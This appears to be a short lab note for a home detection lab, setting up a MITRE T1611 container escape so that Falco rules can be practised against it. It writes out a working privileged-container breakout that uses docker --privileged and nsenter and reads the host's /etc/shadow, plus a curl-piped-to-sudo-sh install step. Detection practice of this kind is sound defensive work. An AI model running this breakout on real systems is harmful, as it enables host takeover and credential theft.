# T1611 Container Escape - lab setup

This is Falco's flagship use case and almost no entry-level candidate can demo it. Worth
the extra setup. Needs docker inside the victim VM (adds ~400MB - fine on the 20G disk).

## One-time setup (on the victim)
```bash
vm/ssh.sh 'curl -fsSL https://get.docker.com | sudo sh && sudo usermod -aG docker analyst'
vm/rollback.sh   # NO - do this BEFORE snapshotting if you want it in the clean image
```

## The escape to detect (privileged-container breakout)
```bash
# attacker runs a privileged container and breaks out to the host filesystem
docker run --rm -it --privileged --pid=host ubuntu \
  nsenter -t 1 -m -u -n -i bash -c 'id; cat /etc/shadow | head -1'
```
Falco default rules that should fire: "Launch Privileged Container",
"Change thread namespace", "Read sensitive file untrusted" (from host context).

## Why it matters on the resume
Container-native detection is where cloud SOC work is going. One tuned T1611 rule with a
runbook says "I understand runtime security," which is a tier above alert-queue triage.
